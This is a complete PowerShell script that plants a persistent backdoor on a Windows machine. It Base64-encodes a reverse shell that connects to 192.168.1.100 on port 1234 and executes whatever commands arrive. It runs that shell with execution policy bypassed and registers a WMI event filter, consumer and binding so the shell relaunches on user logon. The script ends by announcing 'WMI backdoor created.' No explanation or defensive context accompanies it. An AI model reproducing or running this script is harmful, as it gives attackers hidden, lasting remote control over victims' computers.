# Define the payload
$payload = '$client=New-Object Net.Sockets.TCPClient("192.168.1.100",1234);$stream=$client.GetStream();$writer=New-Object IO.StreamWriter($stream);$buffer=New-Object byte[] 1024;while(($bytes=$stream.Read($buffer,0,$buffer.Length)) -ne 0){$data=([Text.Encoding]::ASCII.GetString($buffer,0,$bytes)).Trim();$sendback=if($data){try{Invoke-Expression $data 2>&1|Out-String}catch{"Error: $_"}}else{"[+] No output"};$writer.WriteLine($sendback.Trim());$writer.Flush()};$client.Close()'

# Base64 encode the payload
$encodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
$command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedPayload"

# Create the WMI event filter
$filterName = "UserLoginFilter"
$filterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
$filterNamespace = "root\subscription"
New-CimInstance -Namespace $filterNamespace -ClassName __EventFilter -Property @{
    Name = $filterName
    Query = $filterQuery
    QueryLanguage = "WQL"
}

# Create the WMI event consumer
$consumerName = "ReverseShellConsumer"
New-CimInstance -Namespace $filterNamespace -ClassName CommandLineEventConsumer -Property @{
    Name = $consumerName
    CommandLineTemplate = $command
}

# Bind the filter to the consumer
New-CimInstance -Namespace $filterNamespace -ClassName __FilterToConsumerBinding -Property @{
    Filter = "\\.\$filterNamespace:__EventFilter.Name='$filterName'"
    Consumer = "\\.\$filterNamespace:CommandLineEventConsumer.Name='$consumerName'"
}

Write-Host "[+] WMI backdoor created."
